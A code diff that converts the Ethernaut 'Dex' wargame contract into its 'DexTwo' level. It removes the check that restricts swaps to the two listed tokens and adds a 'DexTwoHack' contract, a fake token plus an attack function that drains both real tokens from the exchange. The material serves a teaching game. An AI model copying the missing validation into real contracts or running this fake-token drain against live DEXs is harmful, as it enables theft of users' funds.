@@ -1,25 +1,12 @@
-// The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
-// You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
-// You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract,
-// and allow the contract to report a "bad" price of the assets.
-
-// Quick note
-// Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.
-
-//   Things that might help:
-
-// How is the price of the token calculated?
-// How does the swap method work?
-// How do you approve a transaction of an ERC20?
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
+
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/math/SafeMath.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract Dex is Ownable {
+contract DexTwo is Ownable {
     using SafeMath for uint256;
     address public token1;
     address public token2;
@@ -31,7 +18,7 @@ contract Dex is Ownable {
         token2 = _token2;
     }
 
-    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
+    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
         IERC20(token_address).transferFrom(msg.sender, address(this), amount);
     }
 
@@ -40,15 +27,14 @@ contract Dex is Ownable {
         address to,
         uint256 amount
     ) public {
-        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
         require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
-        uint256 swapAmount = getSwapPrice(from, to, amount);
+        uint256 swapAmount = getSwapAmount(from, to, amount);
         IERC20(from).transferFrom(msg.sender, address(this), amount);
         IERC20(to).approve(address(this), swapAmount);
         IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
     }
 
-    function getSwapPrice(
+    function getSwapAmount(
         address from,
         address to,
         uint256 amount
@@ -57,8 +43,8 @@ contract Dex is Ownable {
     }
 
     function approve(address spender, uint256 amount) public {
-        SwappableToken(token1).approve(msg.sender, spender, amount);
-        SwappableToken(token2).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
     }
 
     function balanceOf(address token, address account) public view returns (uint256) {
@@ -66,7 +52,7 @@ contract Dex is Ownable {
     }
 }
 
-contract SwappableToken is ERC20 {
+contract SwappableTokenTwo is ERC20 {
     address private _dex;
 
     constructor(
@@ -86,5 +72,29 @@ contract SwappableToken is ERC20 {
     ) public returns (bool) {
         require(owner != _dex, "InvalidApprover");
         super._approve(owner, spender, amount);
+    }
+}
+
+contract DexTwoHack {
+    function balanceOf(address) public pure returns (uint256) {
+        return 1;
+    }
+
+    function transferFrom(
+        address,
+        address,
+        uint256
+    ) external pure returns (bool) {
+        return true;
+    }
+
+    function attack(DexTwo dex) public {
+        address token1 = dex.token1();
+        address token2 = dex.token2();
+        dex.swap(address(this), dex.token1(), 1);
+        dex.swap(address(this), dex.token2(), 1);
+
+        require(IERC20(token1).balanceOf(address(dex)) == 0, "token1 not zero");
+        require(IERC20(token2).balanceOf(address(dex)) == 0, "token2 not zero");
     }
 }
